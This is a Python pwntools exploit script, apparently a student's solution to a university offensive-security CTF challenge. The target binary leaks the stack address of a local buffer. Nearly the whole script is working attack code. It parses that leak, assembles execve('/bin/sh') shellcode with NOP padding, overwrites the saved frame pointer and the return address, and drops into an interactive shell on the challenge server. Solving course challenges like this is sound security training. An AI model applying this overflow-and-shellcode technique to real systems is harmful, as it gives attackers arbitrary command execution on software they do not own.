'''
There is a vulnerability in that the program prints the location of the local variable
So return address can be ponted to the local variable
'''


from pwn import *
from time import sleep

localsize = 32 #size of local variable array from analysis
netid = "tk1931"

# for the local machine
#sh = process('./school')

# for the remote machine
sh = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)

'''
# attach debugger for local machine
gdb.attach(sh, "break *0x400665\ncontinue")

sleep(2)
'''

# Also for the remote server
print(sh.recvuntil(': ')) # wait to ask for NetID
sh.sendline(netid) # give it the NetID
print(netid)
openner = sh.recvline() # wait until accepted

# wait for the first line (saying where the locals are)
openner = sh.recvline()
print(openner)
localsAddress = None

for i in openner.split() :
	if ("0x" in i) :
		localsAddress = i[:-1]

localAddress = p64(int(localsAddress, 16))

assemblyCode = '''
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
xor esi, esi
push 0x3b
pop rax
cdq
syscall
'''

assemblyEncoded = asm(assemblyCode, arch = 'amd64', os = 'linux')

assemblyBuff = 'nop\n' * (localsize - len(assemblyEncoded))
buffEncoded = asm(assemblyBuff, arch = 'amd64', os = 'linux')

instr = assemblyEncoded + buffEncoded


bpFiller = "A" * 8

finalPass = instr + bpFiller + localAddress

sh.sendline(finalPass)

# the shell should be open and ready to accept arguments
sh.interactive()

